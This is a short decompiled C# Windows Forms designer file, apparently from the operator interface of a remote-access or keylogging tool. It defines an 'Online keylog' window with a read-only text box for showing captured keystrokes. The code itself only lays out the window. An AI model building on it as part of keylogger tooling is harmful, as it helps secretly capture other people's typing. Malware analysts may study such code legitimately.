﻿// Token: 0x020000EA RID: 234
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public sealed partial class fKeylogOnline : global::System.Windows.Forms.Form
{
	// Token: 0x06000B7D RID: 2941 RVA: 0x000595C4 File Offset: 0x000577C4
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x06000B7E RID: 2942 RVA: 0x00059604 File Offset: 0x00057804
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.vmethod_1(new global::System.Windows.Forms.RichTextBox());
		base.SuspendLayout();
		this.vmethod_0().Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.vmethod_0().BackColor = global::System.Drawing.Color.White;
		this.vmethod_0().Location = new global::System.Drawing.Point(1, 2);
		this.vmethod_0().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_0().Name = "rtKeylogOnline";
		this.vmethod_0().ReadOnly = true;
		this.vmethod_0().ScrollBars = global::System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.vmethod_0().Size = new global::System.Drawing.Size(684, 325);
		this.vmethod_0().TabIndex = 2;
		this.vmethod_0().Text = string.Empty;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.SystemColors.AppWorkspace;
		base.ClientSize = new global::System.Drawing.Size(685, 328);
		base.Controls.Add(this.vmethod_0());
		base.Name = "fKeylogOnline";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "Online keylog";
		base.ResumeLayout(false);
	}

	// Token: 0x04000454 RID: 1108
	private global::System.ComponentModel.IContainer icontainer_0;
}
